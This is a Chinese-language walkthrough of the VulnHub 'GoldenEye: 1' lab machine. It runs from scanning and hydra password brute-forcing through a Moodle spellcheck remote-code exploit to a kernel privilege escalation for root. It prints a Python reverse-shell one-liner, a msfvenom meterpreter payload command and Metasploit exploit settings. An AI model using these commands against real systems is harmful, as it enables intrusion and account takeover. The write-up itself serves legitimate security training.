# GoldenEye: 1

https://www.vulnhub.com/entry/goldeneye-1,240/#release

difficulty: Intermediate

Finish Date：2024-4-7

## IP

192.168.10.150

## Scan

Open Port -> 25,80,55006,55007

```
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| fingerprint-strings:
|   Hello:
|     220 ubuntu GoldentEye SMTP Electronic-Mail agent
|_    Syntax: EHLO hostname
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: PIPELINING SASL(PLAIN) TOP AUTH-RESP-CODE RESP-CODES CAPA UIDL USER
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_pop3-capabilities: PIPELINING CAPA UIDL STLS AUTH-RESP-CODE RESP-CODES SASL(PLAIN) TOP USER
```

先访问 80 web 服务，得到提示：

```
User: UNKNOWN
Naviagate to /sev-home/ to login
```

访问 http://192.168.10.150/sev-home/，是一个Basic认证，需要获得用户名和密码才能登陆。

继续对页面进行侦察，查看源代码，发现 terminal.js 中有重要提示：

```
Boris, make sure you update your default password.
My sources say MI6 maybe planning to infiltrate.
Be on the lookout for any suspicious network traffic....

I encoded you p@ssword below...
&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;

BTW Natalya says she can break your codes
```

根据提示，猜测用户名是 boris，并且默认密码没有更改。对 `&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;` 进行 HTML 解码，对应值为：InvincibleHack3r，使用此凭证 boris:InvincibleHack3r 登陆 /sev-home/。

得到如下内容：

```
GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)

Please email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system

Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port
```

继续查看源代码，发现如下提示：

```
Qualified GoldenEye Network Operator Supervisors:
Natalya
Boris
```

获得了两个管理员用户名：natalya、boris。

尝试使用 boris:InvincibleHack3r 凭证登陆 pop3 55007 查看邮件：

```
telnet 192.168.10.150 55007
USER boris
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
```

认证不对，看样子是密码不对，暂时找不到其他密码，只能先试试暴力破解。

尝试用 hydra 对 natalya、boris 两个用户进行爆破，最开始使用 Seclist 中的 rockyou.txt 没有爆破出来，然后尝试下面 kali 自带的字典：

```
hydra -t 20 -l boris -P /usr/share/wordlists/fasttrack.txt pop3://192.168.10.150:55007/

找到了用户对应的密码：
[55007][pop3] host: 192.168.10.150   login: boris   password: secret1!
```

再次尝试登陆 boris:secret1!，看到有 3 封邮件，查看其内容：

```
Trying 192.168.10.150...
Connected to 192.168.10.150.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS secret1!
+OK Logged in.
STAT
+OK 3 1838
LIST
+OK 3 messages:
1 544
2 373
3 921
.

RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id D9E47454B1
	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.

RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id C3F2B454B1
	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.

RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
.
```

第二封邮件说已经破解了 code，第三封邮件说有一个 access code 放在了/root 目录下。我们再次尝试破解 natalya 的 pop3 登陆密码：

```
hydra -t 20 -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://192.168.10.150:55007/
```

得到登陆密码：

```
[55007][pop3] host: 192.168.10.150   login: natalya   password: bird
```

对 natalya 进行登陆，可以看到 2 封邮件，并查看其内容：

```
user natalya
+OK
pass bird
+OK Logged in.
stat
+OK 2 1679
list
+OK 2 messages:
1 631
2 1048
.

retr 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id D5EDA454B1
	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.

retr 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 17C96454B1
	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

看到第 2 封邮件中出现了用户名和密码 xenia:RCP90rulez!，还有一个新的系统，需要我们在/etc/hosts 中添加指向。

```
192.168.10.150  severnaya-station.com
```

然后进行登陆 http://severnaya-station.com/gnocertdir/login/index.php 四处查看，没有发现有用的东西，查看 My Profile -> Message 时，发现了一条信息：
http://severnaya-station.com/gnocertdir/message/index.php?user2=5

```
As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.

My email username is...
doak

Thank you,
Cheers
```

看到了另外一个邮箱用户：doak ，但是没有密码，也没有发现其他有用信息，只能再次使用 hydra 尝试爆破：

```
hydra -t 20 -l doak -P /usr/share/wordlists/fasttrack.txt pop3://192.168.10.150:55007/
```

得到新的凭据：login: doak password: goat，使用此凭据，再次登陆 pop3 55007，获得了一封邮件信息：

```
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 97DC24549D
	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!
```

使用 doak 的凭据进行登陆，继续信息挖掘，在 My profile -> My private files 中发现一个密码文件 s3cret.txt，下载并查看。

```
007,

I was able to capture this apps adm1n cr3ds through clear txt.

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

根据提示，doak 抓取到了 admin 的凭据，但是为了防止扫描，把它放在了/dir007key/for-007.jpg 图片中，访问图片：http://192.168.10.150/dir007key/for-007.jpg 貌似是图片隐写，下载图片，使用 exiftool 进行查看，发现可疑信息。

```
Image Description   : eFdpbnRlcjE5OTV4IQ==
```

对 Description 进行 Base64 解密得到：xWinter1995x!，使用这个密码登陆管理员 admin。登陆后，找了一圈，没找到有用的信息，也没找到直接可以上传 webshell 的地方。尝试在 msf 中搜索，找到了 exploit multi/http/moodle_spelling_binary_rce，使用后，对相应的参数进行设置：

```
   Name       Current Setting        Required  Description
   ----       ---------------        --------  -----------
   PASSWORD   xWinter1995x!          yes       Password to authenticate with
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.10.150         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasp
                                               loit/basics/using-metasploit.html
   RPORT      80                     yes       The target port (TCP)
   SESSKEY                           no        The session key of the user to impersonate
   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /gnocertdir            yes       The URI of the Moodle installation
   USERNAME   admin                  yes       Username to authenticate with
   VHOST      severnaya-station.com  no        HTTP server virtual host


   Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.10.3     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

run 后发现无法创建 session，查看 exp 源码后，发现 's_editor_tinymce_spellengine' => 'PSpellShell' 需要这样设置，重新在后台管理页面中 Home -> Site administration -> Plugins -> Text editors -> TinyMCE HTML editor 进行设置， http://severnaya-station.com/gnocertdir/admin/settings.php?section=editorsettingstinymce 修改 Spell engine 为 PSpellShell，保存后，重新进行利用，获得了反弹的 shell。

另外一种反弹 shell 的方法是：http://severnaya-station.com/gnocertdir/admin/settings.php?section=systempaths 中设置 Path to aspell 中的内容为反弹的 shell 命令，然后在 http://severnaya-station.com/gnocertdir/blog/edit.php?action=add 中编辑文章中，点击 spell check，就会调用上面 system path 中设置的命令，就会获得反弹的 shell。

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.3",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

对 tty 进行升级：python -c 'import pty; pty.spawn("/bin/bash")' 发现终端不稳定，可以利用 msfvenom 生成 elf 后门，然后 wget 上传到/tmp 目录，重新生成稳定的反向连接。

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.10.3 LPORT=9999 -f elf -o reverse.elf

然后再 msfconsole 中创建监听，接收反弹：
handler -H 192.168.10.3 -P 9999 -p linux/x64/meterpreter/reverse_tcp
```

获得了稳定的 shell 之后进一步进行信息收集，上传 linpeas，没发现其他有用信息，只发现了内核版本可能存在漏洞：

```
OS: Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) )
```

exploidDB 上搜索，找到了 https://www.exploit-db.com/exploits/37292，将漏洞代码下载：searchsploit -m 37292，尝试将目标代码下载到目标机器，使用 gcc 进行编译，发现目标机器没有 gcc，但是找到了/usr/bin/cc，使用它对代码进行编译，在编译前，将源代码的 143 行 改成 cc 编译 lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w"); 当然使用检测出的 dirtyCow 也可以提权到 root。

编译后，进行执行，获得了 root 权限：

```
cc 37292.c -o ofs
./ofs
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

## flag

查看/root 目录，发现.flag.txt 进行查看：

```
# cat .flag.txt

Alec told me to place the codes here:

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```
